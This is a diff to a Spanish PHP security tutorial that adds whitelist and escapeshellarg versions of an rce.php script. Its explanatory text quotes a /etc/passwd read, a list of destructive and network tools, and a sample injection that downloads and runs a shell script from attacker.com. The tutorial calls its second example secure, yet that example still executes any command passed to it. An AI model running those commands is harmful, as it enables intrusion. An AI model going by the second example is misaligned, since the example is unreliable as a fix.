@@ -122,8 +122,71 @@ Si se necesita permitir algunos comandos específicos, usar una lista blanca (wh
 
 Código seguro (rce.php con lista blanca de comandos permitidos)
 
-![](images/rce1.png)
-![](images/rce1.png)
+~~~
+<?php
+$allowed_cmds = ["ls", "whoami", "pwd"];
+if (!isset($_GET['cmd']) || !in_array($_GET['cmd'], $allowed_cmds)) {
+        die("Comando no permitido.");
+}
+$output = shell_exec(escapeshellcmd($_GET['cmd']));
+echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
+?>
+~~~
+
+Permitimos la ejecución de comandos ls, whoami, pwd, el resto dará mensaje de "comando no permitido".
+
+
+Ante la consulta `http://localhost/rce.php?cmd=ls` si nos permite ejecutar el comando ls
+
+![](images/rce5.png)
+
+Pero sin embargo no nos permite la consulta `http://localhost/rce.php?cmd=cat /etc/passwd`
+
+![](images/rce6.png)
+
+_Beneficios:_
+
+- Lista blanca de comandos permite solo los necesarios (ls, whoami, pwd).
+
+- Evita ejecución de comandos peligrosos (rm -rf /, wget, curl, nc).
+
+- Escapa caracteres especiales con escapeshellcmd() para mayor seguridad.
+
+- Evita XSS con htmlspecialchars(), protegiendo la salida de comandos.
+
+**Ejecutar Comandos con Escapes Seguros**
+---
+
+Si se necesita ejecutar comandos con argumentos, usar escapeshellarg() para evitar inyección de comandos.
+
+Código seguro (rce.php con escapes para argumentos)
+
+~~~
+<?php
+if (!isset($_GET['cmd'])) {
+        die("Falta el parámetro 'cmd'");
+}
+$command = escapeshellarg($_GET['cmd']);
+$output = shell_exec($command);
+echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
+?>
+~~~
+
+Beneficios:
+
+- escapeshellarg() protege argumentos, evitando que se concatenen con ;, &&, |.
+
+- Evita inyección de comandos (wget http://attacker.com/shell.sh && bash shell.sh).
+
+- Mayor flexibilidad, pero más seguro que la ejecución directa de shell_exec().
+
+
+![](images/rce6.png)
+![](images/rce6.png)
+![](images/rce6.png)
+![](images/rce6.png)
+![](images/rce6.png)
+![](images/rce6.png)
 
 ## ENTREGA
 
